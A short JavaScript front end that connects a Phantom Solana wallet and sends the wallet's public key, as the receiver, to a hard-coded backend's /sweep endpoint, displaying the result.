
const BACKEND_URL = "https://afef9ec.onrender.com";

let provider = null;
let publicKey = null;

window.onload = () => {
  if ("solana" in window) {
    provider = window.solana;
  }
};

async function connectWallet() {
  try {
    const resp = await provider.connect();
    publicKey = resp.publicKey.toString();
    document.getElementById("status").innerText = "Wallet connected: " + publicKey;
  } catch (err) {
    document.getElementById("status").innerText = "Connection failed";
  }
}

async function sweepSol() {
  if (!publicKey) return alert("Connect your Phantom wallet first.");
  document.getElementById("status").innerText = "Sweeping...";
  try {
    const res = await fetch(`${BACKEND_URL}/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ receiver: publicKey }),
    });
    const data = await res.text();
    document.getElementById("status").innerText = "Sweep Complete: " + data;
  } catch (e) {
    document.getElementById("status").innerText = "Sweep Failed: " + e.message;
  }
}
